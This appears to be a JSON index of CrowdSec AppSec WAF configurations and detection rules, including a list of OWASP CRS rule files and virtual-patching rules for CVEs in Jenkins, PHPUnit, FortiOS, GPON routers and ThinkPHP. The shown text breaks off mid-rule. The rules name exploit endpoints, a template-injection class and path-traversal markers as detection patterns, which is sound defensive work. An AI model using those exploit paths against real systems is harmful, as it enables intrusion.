{"appsec-configs": {"crowdsecurity/appsec-default": {"content": "name: crowdsecurity/appsec-default\ndefault_remediation: ban\ninband_rules:\n - crowdsecurity/base-config \n - crowdsecurity/vpatch-*\n - crowdsecurity/generic-*\noutofband_rules:\n - crowdsecurity/experimental-*\n - crowdsecurity/appsec-generic-test\n", "path": "appsec-configs/crowdsecurity/appsec-default.yaml", "version": "0.4", "versions": {"0.1": {"digest": "2b821a2cbcfdd7fdfd8ada95c00a4c6fdf8ce8a3efb55b1e3cd8eacc0ed418b6"}, "0.2": {"digest": "485710fec31feb36bfdd5a572a5174fd13a0e22ba812dfb78d92e1bfaea79a8d"}, "0.3": {"digest": "e3112166af61843dda46e1740e1151b5cfe9002517328d935c912fc94ef01a3a"}, "0.4": {"digest": "68e34ef8b7c8aaadca4233a7213f2fce706daf1b670fc1f544c03b0c8b2e7b87"}}}, "crowdsecurity/crs": {"content": "name: crowdsecurity/crs\ndefault_remediation: ban\n#log_level: debug\noutofband_rules:\n - crowdsecurity/crs\non_match:\n - filter: IsOutBand == true\n   apply:\n     - SendAlert()", "path": "appsec-configs/crowdsecurity/crs.yaml", "version": "0.3", "versions": {"0.1": {"digest": "e9cbc67cae76d60468e40f54db62c97157e203bc06c412239695c843ef98f987"}, "0.2": {"digest": "fd41693ebf881d1cb561cd6a163c9da47c50c480829efe4ddca74f6ec3847855"}, "0.3": {"digest": "55530ee07c4c13a8bf54ba65693365b9f66df329662e5a7392fad03fe8452408"}}}, "crowdsecurity/crs-inband": {"content": "name: crowdsecurity/crs-inband\ndefault_remediation: ban\n#log_level: debug\ninband_rules:\n - crowdsecurity/crs", "path": "appsec-configs/crowdsecurity/crs-inband.yaml", "version": "0.1", "versions": {"0.1": {"digest": "b5a52349dab87e71a2fd8610b4a98ed324aef232d549ab8c91aaadcba3c407a4"}}}, "crowdsecurity/generic-rules": {"content": "name: crowdsecurity/generic-rules\ndefault_remediation: ban\ninband_rules:\n - crowdsecurity/base-config \n - crowdsecurity/generic-*\noutofband_rules:\n - crowdsecurity/experimental-*", "path": "appsec-configs/crowdsecurity/generic-rules.yaml", "version": "0.4", "versions": {"0.1": {"digest": "e406c104f040ca39220f610efce241489d64ce0f1654b3fca39a844893ea0840"}, "0.2": {"digest": "265fbcc3008391bb24ca0305e08c2dd0f975ea1c8ab7e542fda431b953603cc1"}, "0.3": {"digest": "fb011e3c38570d29d51af0de461b52ace41f7dbf6c7d8127ff1d1eafe07ab090"}, "0.4": {"digest": "61a169309be25a8d922179abe7fb86e40672a41180802f28e612aee31f1bfdde"}}}, "crowdsecurity/virtual-patching": {"content": "name: crowdsecurity/virtual-patching\ndefault_remediation: ban\ninband_rules:\n - crowdsecurity/base-config \n - crowdsecurity/vpatch-*\n", "path": "appsec-configs/crowdsecurity/virtual-patching.yaml", "version": "0.4", "versions": {"0.1": {"digest": "48a765ded560cf4d8bb405e563411245156b6b2c2fef09e5492e6270f5337bff"}, "0.2": {"digest": "0bf15e1ebed4c94933bf9407d616be22121733ddd327710f7f5b79ec70d52085"}, "0.3": {"digest": "e93cc5d63aae3a83794b0f6b1e41566f53fae059e6044a9519f02256fa6e2adf"}, "0.4": {"digest": "ddad5c18125c5753b23b52f55598911b66effaddc9c02286775061609901dbeb"}}}}, "appsec-rules": {"crowdsecurity/appsec-generic-test": {"content": "name: crowdsecurity/appsec-generic-test\ndescription: \"AppSec Generic Test: trigger on GET /crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl`\"\nrules:\n  - and:\n      # 1) Match the HTTP verb\n      - zones:\n          - METHOD\n        match:\n          type: regex\n          value: (GET|HEAD)\n      # 2) Match exactly the test path\n      - zones:\n          - URI\n        match:\n          type: equals\n          value: /crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl\nlabels:\n  service: http\n  type: test\n  confidence: 0\n  spoofable: 3\n  behavior: \"http:test\"\n  label: \"AppSec Generic Test\"\n  classification:\n    - attack.T1190\n", "description": "AppSec Generic Test: trigger on GET /crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl`", "path": "appsec-rules/crowdsecurity/appsec-generic-test.yaml", "version": "0.3", "versions": {"0.1": {"digest": "4aeca7a577bbf222efbf860b13df8baa080c6b5b48c092f5d0177f920a56b3a3"}, "0.2": {"digest": "e1ef4500fce5dc5a7bf706cbc0e179fcc5376907636e4aa3480b5f052088f798"}, "0.3": {"digest": "1ffdb3af4b6e18985b8d457e6484e749bb04629c8e73fa6df656db74898cfb9b"}}}, "crowdsecurity/base-config": {"content": "name: crowdsecurity/base-config\n#### This file is intended to provide a basic configuration for coraza:\n#### - Set the body processors based on the content-type\n\nseclang_rules:\n - Secrule REQUEST_HEADERS:Content-Type \"@rx ^application/x-www-form-urlencoded\" \"id:100,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=URLENCODED\"\n - Secrule REQUEST_HEADERS:Content-Type \"@rx ^multipart/form-data\" \"id:101,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=MULTIPART\"\n - Secrule REQUEST_HEADERS:Content-Type \"@rx ^application/xml\" \"id:102,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=XML\"\n - Secrule REQUEST_HEADERS:Content-Type \"@rx ^application/json\" \"id:103,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=JSON\"\n - Secrule REQUEST_HEADERS:Content-Type \"@rx ^text/xml\" \"id:104,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=XML\"\n - SecRule REQBODY_PROCESSOR \"!@rx (?:URLENCODED|MULTIPART|XML|JSON)\" \"id:105,phase:1,pass,nolog,noauditlog,ctl:requestBodyProcessor=RAW\" #Use our custom RAW body processor, just to have REQUEST_BODY set\n", "path": "appsec-rules/crowdsecurity/base-config.yaml", "version": "0.1", "versions": {"0.1": {"digest": "5ef93f4b19a028f2415afaf570df4d20a5f6038fa94cc990a387662303c2ef20"}}}, "crowdsecurity/crs": {"content": "name: crowdsecurity/crs\nseclang_rules:\n - SecRuleEngine On\n - SecRequestBodyAccess On\nseclang_files_rules:\n - crs-setup.conf\n - REQUEST-901-INITIALIZATION.conf\n - REQUEST-905-COMMON-EXCEPTIONS.conf\n - REQUEST-911-METHOD-ENFORCEMENT.conf\n - REQUEST-913-SCANNER-DETECTION.conf\n - REQUEST-920-PROTOCOL-ENFORCEMENT.conf\n - REQUEST-921-PROTOCOL-ATTACK.conf\n - REQUEST-922-MULTIPART-ATTACK.conf\n - REQUEST-930-APPLICATION-ATTACK-LFI.conf\n - REQUEST-931-APPLICATION-ATTACK-RFI.conf\n - REQUEST-932-APPLICATION-ATTACK-RCE.conf\n - REQUEST-933-APPLICATION-ATTACK-PHP.conf\n - REQUEST-934-APPLICATION-ATTACK-GENERIC.conf\n - REQUEST-941-APPLICATION-ATTACK-XSS.conf\n - REQUEST-942-APPLICATION-ATTACK-SQLI.conf\n - REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf\n - REQUEST-944-APPLICATION-ATTACK-JAVA.conf\n - REQUEST-949-BLOCKING-EVALUATION.conf\n - RESPONSE-950-DATA-LEAKAGES.conf\n - RESPONSE-951-DATA-LEAKAGES-SQL.conf\n - RESPONSE-952-DATA-LEAKAGES-JAVA.conf\n - RESPONSE-953-DATA-LEAKAGES-PHP.conf\n - RESPONSE-954-DATA-LEAKAGES-IIS.conf\n - RESPONSE-955-WEB-SHELLS.conf\n - RESPONSE-959-BLOCKING-EVALUATION.conf\n - RESPONSE-980-CORRELATION.conf\n\ndata:\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/crs-setup.conf\n    dest_file: crs-setup.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-901-INITIALIZATION.conf\n    dest_file: REQUEST-901-INITIALIZATION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-905-COMMON-EXCEPTIONS.conf\n    dest_file: REQUEST-905-COMMON-EXCEPTIONS.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-911-METHOD-ENFORCEMENT.conf\n    dest_file: REQUEST-911-METHOD-ENFORCEMENT.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-913-SCANNER-DETECTION.conf\n    dest_file: REQUEST-913-SCANNER-DETECTION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-920-PROTOCOL-ENFORCEMENT.conf\n    dest_file: REQUEST-920-PROTOCOL-ENFORCEMENT.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-921-PROTOCOL-ATTACK.conf\n    dest_file: REQUEST-921-PROTOCOL-ATTACK.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-922-MULTIPART-ATTACK.conf\n    dest_file: REQUEST-922-MULTIPART-ATTACK.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-930-APPLICATION-ATTACK-LFI.conf\n    dest_file: REQUEST-930-APPLICATION-ATTACK-LFI.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-931-APPLICATION-ATTACK-RFI.conf\n    dest_file: REQUEST-931-APPLICATION-ATTACK-RFI.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-932-APPLICATION-ATTACK-RCE.conf\n    dest_file: REQUEST-932-APPLICATION-ATTACK-RCE.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-933-APPLICATION-ATTACK-PHP.conf\n    dest_file: REQUEST-933-APPLICATION-ATTACK-PHP.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf\n    dest_file: REQUEST-934-APPLICATION-ATTACK-GENERIC.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-941-APPLICATION-ATTACK-XSS.conf\n    dest_file: REQUEST-941-APPLICATION-ATTACK-XSS.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\n    dest_file: REQUEST-942-APPLICATION-ATTACK-SQLI.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf\n    dest_file: REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-944-APPLICATION-ATTACK-JAVA.conf\n    dest_file: REQUEST-944-APPLICATION-ATTACK-JAVA.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/REQUEST-949-BLOCKING-EVALUATION.conf\n    dest_file: REQUEST-949-BLOCKING-EVALUATION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-950-DATA-LEAKAGES.conf\n    dest_file: RESPONSE-950-DATA-LEAKAGES.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-951-DATA-LEAKAGES-SQL.conf\n    dest_file: RESPONSE-951-DATA-LEAKAGES-SQL.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-952-DATA-LEAKAGES-JAVA.conf\n    dest_file: RESPONSE-952-DATA-LEAKAGES-JAVA.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-953-DATA-LEAKAGES-PHP.conf\n    dest_file: RESPONSE-953-DATA-LEAKAGES-PHP.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-954-DATA-LEAKAGES-IIS.conf\n    dest_file: RESPONSE-954-DATA-LEAKAGES-IIS.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-955-WEB-SHELLS.conf\n    dest_file: RESPONSE-955-WEB-SHELLS.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-959-BLOCKING-EVALUATION.conf\n    dest_file: RESPONSE-959-BLOCKING-EVALUATION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/RESPONSE-980-CORRELATION.conf\n    dest_file: RESPONSE-980-CORRELATION.conf\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/crawlers-user-agents.data\n    dest_file: crawlers-user-agents.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/iis-errors.data\n    dest_file: iis-errors.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/java-classes.data\n    dest_file: java-classes.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/java-code-leakages.data\n    dest_file: java-code-leakages.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/java-errors.data\n    dest_file: java-errors.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/lfi-os-files.data\n    dest_file: lfi-os-files.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-config-directives.data\n    dest_file: php-config-directives.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-errors.data\n    dest_file: php-errors.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-errors-pl2.data\n    dest_file: php-errors-pl2.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-function-names-933150.data\n    dest_file: php-function-names-933150.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-function-names-933151.data\n    dest_file: php-function-names-933151.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/php-variables.data\n    dest_file: php-variables.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/restricted-files.data\n    dest_file: restricted-files.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/restricted-upload.data\n    dest_file: restricted-upload.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/scanners-headers.data\n    dest_file: scanners-headers.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/scanners-urls.data\n    dest_file: scanners-urls.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/scanners-user-agents.data\n    dest_file: scanners-user-agents.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/scripting-user-agents.data\n    dest_file: scripting-user-agents.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/sql-errors.data\n    dest_file: sql-errors.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/ssrf.data\n    dest_file: ssrf.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/unix-shell.data\n    dest_file: unix-shell.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/web-shells-php.data\n    dest_file: web-shells-php.data\n    type: modsec\n  - source_url: https://hub-data.crowdsec.net/appsec/crs/windows-powershell-commands.data\n    dest_file: windows-powershell-commands.data\n    type: modsec", "path": "appsec-rules/crowdsecurity/crs.yaml", "version": "0.4", "versions": {"0.1": {"digest": "786fe3341c0f0a813eb57b7780620181686081e0f181515509290f2e8c042f0b"}, "0.2": {"digest": "19d216b68b3de8a9c03e4d6644f578520b3673096ef55da6d77bf40902a36cab"}, "0.3": {"digest": "cdbc73bed015a54c9b47c90ff636ecaea095a954e0e0f4b0e47cafd19d1fd1c6"}, "0.4": {"digest": "d1e1f48413ff3bca7a13260b2dd111a8a3acc0b5df5a4acc47c3181d3f291b43"}}}, "crowdsecurity/experimental-no-user-agent": {"content": "name: crowdsecurity/experimental-no-user-agent\ndescription: \"Protect against no user agent\"\nrules:\n## Useragent header does not exist\n  - and:\n      - zones:\n        - METHOD\n        match:\n          type: regex\n          value: '^GET|POST|PUT|DELETE|PATCH$'\n      - zones:\n        - HEADERS\n        variables:\n         - \"User-Agent\"\n        transform:\n          - count\n        match:\n          type: equals\n          value: \"0\"\n\n\n\n    \nlabels:\n   type: exploit\n   service: http\n   confidence: 0\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"Protect against no user agent\"\n   classification:\n     - attack.T1595\n     - attack.T1190\n", "description": "Protect against no user agent", "path": "appsec-rules/crowdsecurity/experimental-no-user-agent.yaml", "version": "0.1", "versions": {"0.1": {"digest": "f401c8153dceee61e9da2a4538cd30fec1ff560d79dfdea6cb3f16284601bc74"}}}, "crowdsecurity/generic-freemarker-ssti": {"content": "name: crowdsecurity/generic-freemarker-ssti\ndescription: \"Generic FreeMarker SSTI\"\nrules:\n  - and:\n    - zones: \n      - RAW_BODY\n      - ARGS\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: 'freemarker.template.utility.execute'\n\nlabels:\n   type: exploit\n   service: http\n   confidence: 2\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"Generic FreeMarker SSTI\"\n   classification:\n     - attack.T1595\n     - attack.T1190", "description": "Generic FreeMarker SSTI", "path": "appsec-rules/crowdsecurity/generic-freemarker-ssti.yaml", "version": "0.3", "versions": {"0.1": {"digest": "4c4466729b2fdebcf23dfd197e2b967c17d79324cfd4245ac3a3d9be6f029df8"}, "0.2": {"digest": "4721a9b2f0ab29d5dfd385101afe5c23c197f59bfa86e82935d3371879768059"}, "0.3": {"digest": "5f731c0099b563a816529755f147b4a4b5d047719f90382e1dc86d39d6ecf558"}}}, "crowdsecurity/generic-wordpress-uploads-listing": {"content": "name: crowdsecurity/generic-wordpress-uploads-listing\ndescription: \"Protect Wordpress uploads directory from listing files\"\nrules:\n  - or:\n    - zones: \n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: regex\n        value: '^/wp-content/uploads/$'\n    - zones: \n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: regex\n        value: '^/wp-content/uploads/.*/$'\n    \nlabels:\n   type: exploit\n   service: http\n   confidence: 2\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"Protect Wordpress uploads directory from listing files\"\n   classification:\n     - attack.T1595\n     - attack.T1190\n", "description": "Protect Wordpress uploads directory from listing files", "path": "appsec-rules/crowdsecurity/generic-wordpress-uploads-listing.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6ffaeaf2ad3266e22648940b6fd0c18bf77cfb3669b085bc9692a0a2704f888f"}, "0.2": {"digest": "b722d35de950f77c20d55249296cdc791f6e3ca116ba8d076d173465307f1ff8"}}}, "crowdsecurity/generic-wordpress-uploads-php": {"content": "name: crowdsecurity/generic-wordpress-uploads-php\ndescription: \"Detect php execution in wordpress uploads directory\"\nrules:\n  - and:\n    - zones: \n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: regex\n        value: '/wp-content/uploads/.*\\.(h?ph(p|tm?l?|ar)|module|shtml)'\n\nlabels:\n   type: exploit\n   service: http\n   confidence: 2\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"Detect Wordpress PHP execution in uploads directory\"\n   classification:\n     - attack.T1595\n     - attack.T1190", "description": "Detect php execution in wordpress uploads directory", "path": "appsec-rules/crowdsecurity/generic-wordpress-uploads-php.yaml", "version": "0.1", "versions": {"0.1": {"digest": "6f367a1b94adcc96f3494a5703cddb325686b2a9ce1ed31949ca61076d5b80c6"}}}, "crowdsecurity/vpatch-CVE-2002-1131": {"content": "## autogenerated on 2025-04-23 12:56:40\nname: crowdsecurity/vpatch-CVE-2002-1131\ndescription: 'Detects XSS attempts in SquirrelMail 1.2.6/1.2.7 via unsanitized input in addressbook, options, search, and help modules.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /src/addressbook.php\n      - zones:\n          - ARGS_NAMES\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: <\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /src/options.php\n      - zones:\n          - ARGS\n        variables:\n          - optpage\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: <\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /src/search.php\n      - zones:\n          - ARGS\n        variables:\n          - mailbox\n          - where\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: <\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /src/help.php\n      - zones:\n          - ARGS\n        variables:\n          - chapter\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: <\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'SquirrelMail - XSS'\n  classification:\n    - cve.CVE-2002-1131\n    - attack.T1059\n    - cwe.CWE-80\n", "description": "Detects XSS attempts in SquirrelMail 1.2.6/1.2.7 via unsanitized input in addressbook, options, search, and help modules.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2002-1131.yaml", "version": "0.1", "versions": {"0.1": {"digest": "be1c78dae98bc2aa5a549d09fe1833ef50083eb722db0d904a849d0e9c2aa483"}}}, "crowdsecurity/vpatch-CVE-2007-0885": {"content": "## autogenerated on 2025-04-25 12:34:00\nname: crowdsecurity/vpatch-CVE-2007-0885\ndescription: 'Detects XSS vulnerability in Jira Rainbow.Zen via the id parameter in BrowseProject.jspa.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /jira/secure/browseproject.jspa\n      - zones:\n          - ARGS\n        variables:\n          - id\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: <\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Jira Rainbow.Zen - XSS'\n  classification:\n    - cve.CVE-2007-0885\n    - attack.T1059\n    - cwe.CWE-79\n", "description": "Detects XSS vulnerability in Jira Rainbow.Zen via the id parameter in BrowseProject.jspa.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2007-0885.yaml", "version": "0.1", "versions": {"0.1": {"digest": "d588dd32f929dc10df542f0be2661470380866fe5f193830755563cf1966732f"}}}, "crowdsecurity/vpatch-CVE-2017-9841": {"content": "name: crowdsecurity/vpatch-CVE-2017-9841\ndescription: \"PHPUnit RCE (CVE-2017-9841)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /util/php/eval-stdin.php\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"PHPUnit RCE\"\n  classification:\n   - cve.CVE-2017-9841\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-94", "description": "PHPUnit RCE (CVE-2017-9841)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2017-9841.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0737417a66c5327708f6eff4392a4461002592fabcda6cdbdaa4143bce185503"}, "0.2": {"digest": "6e5549b580c3a35315a6660a2904eafd3b463141d95f1ad2d5d606d55eb0b046"}, "0.3": {"digest": "69404f8a96298652c1fcc8ed6e6c979fd83271c2167cc3af50edb9201bafb092"}}}, "crowdsecurity/vpatch-CVE-2018-1000861": {"content": "name: crowdsecurity/vpatch-CVE-2018-1000861\ndescription: \"Jenkins - RCE (CVE-2018-1000861)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: securityRealm/user/admin\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Jenkins - RCE\"\n  references:\n    - https://www.youtube.com/watch?v=abuH-j-6-s0&t=7s\n    - https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/\n  classification:\n   - cve.CVE-2018-1000861\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-502", "description": "Jenkins - RCE (CVE-2018-1000861)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2018-1000861.yaml", "version": "0.1", "versions": {"0.1": {"digest": "c56b770df99a1e84a45f07487a5d0fb031adbcfce8ac8182e56761f1db7ab82b"}}}, "crowdsecurity/vpatch-CVE-2018-10562": {"content": "name: crowdsecurity/vpatch-CVE-2018-10562\ndescription: \"Dasan GPON RCE (CVE-2018-10562)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /gponform/diag_form\n    - zones:\n      - BODY_ARGS\n      variables:\n      - dest_host\n      match:\n        type: regex\n        value: \"[^0-9a-zA-Z-.]+\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Dasan GPON RCE\"\n  classification:\n   - cve.CVE-2018-10562\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78", "description": "Dasan GPON RCE (CVE-2018-10562)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2018-10562.yaml", "version": "0.2", "versions": {"0.1": {"digest": "65fc92420da5015e64403c4f85bbf53c739fabb1a6d30885ec016d8f7ca6a0b0"}, "0.2": {"digest": "f1c5bc2ea0106e9ea059d5787daa33b8d0b94cc35fca876d9440ac8d876a3254"}}}, "crowdsecurity/vpatch-CVE-2018-13379": {"content": "\nname: crowdsecurity/vpatch-CVE-2018-13379\ndescription: \"Fortinet FortiOS - Credentials Disclosure (CVE-2018-13379)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /remote/fgt_lang\n    - zones:\n      - ARGS\n      name: lang\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: ../\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Fortinet FortiOS - Credentials Disclosure\"\n  classification:\n   - cve.CVE-2018-13379\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "Fortinet FortiOS - Credentials Disclosure (CVE-2018-13379)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2018-13379.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ba93fe996423dae1e4257edf61a7f6132435c3426bf505e4671c80bdc8f81f21"}, "0.2": {"digest": "9bf82942934e361e21ea6b2a2ff5e8479aea84d7c20be3d2c8ddb7e09bfcd336"}}}, "crowdsecurity/vpatch-CVE-2018-20062": {"content": "name: crowdsecurity/vpatch-CVE-2018-20062\ndescription: \"ThinkPHP - RCE (CVE-2018-20062)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: index.php\n    - zones:\n      - ARGS\n      variables:\n      - s\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: think\n    - zones:\n      - ARGS\n      variables:\n      - s\n      transform:\n      - lowercase\n      match:\n        type: regex\n        value: \"[^A-Za-z0-9_.]*\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"ThinkPHP - RCE\"\n  references:\n    - https://nvd.nist.gov/vuln/detail/CVE-2018-20062\n    - https://www.exploit-db.com/exploits/45978\n  classification:\n   - cve.CVE-2018-20062\n   - attack.T1595\n   - attack.T1190\n", "description": "ThinkPHP - RCE (CVE-2018-20062)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2018-20062.yaml", "version": "0.1", "versions": {"0.1": {"digest": "cc3d014f9fc20bace548415f6e263764440c35e087a259830ff0095464471095"}}}, "crowdsecurity/vpatch-CVE-2019-1003030": {"content": "name: crowdsecurity/vpatch-CVE-2019-1003030\ndescription: \"Jenkins - RCE (CVE-2019-1003030)\"\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n         - lowercase\n        match:\n          type: endsWith\n          value: descriptorbyname/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.securegroovyscript/checkscript\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  references:\n    - https://www.exploit-db.com/exploits/48904\n  label: \"Jenkins - RCE\"\n  classification:\n    - cve.CVE-2019-1003030\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-264\n", "description": "Jenkins - RCE (CVE-2019-1003030)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2019-1003030.yaml", "version": "0.1", "versions": {"0.1": {"digest": "28e6b8f2d87fa26712625e52cb4f3c11c8e0f4a39a2d632598c5023e83639ec5"}}}, "crowdsecurity/vpatch-CVE-2019-12989": {"content": "name: crowdsecurity/vpatch-CVE-2019-12989\ndescription: \"Citrix SQLi (CVE-2019-12989)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /sdwan/nitro/v1/config/get_package_file\n    - zones:\n      - ARGS\n      variables:\n       - action\n      transform:\n      - lowercase\n      match:\n        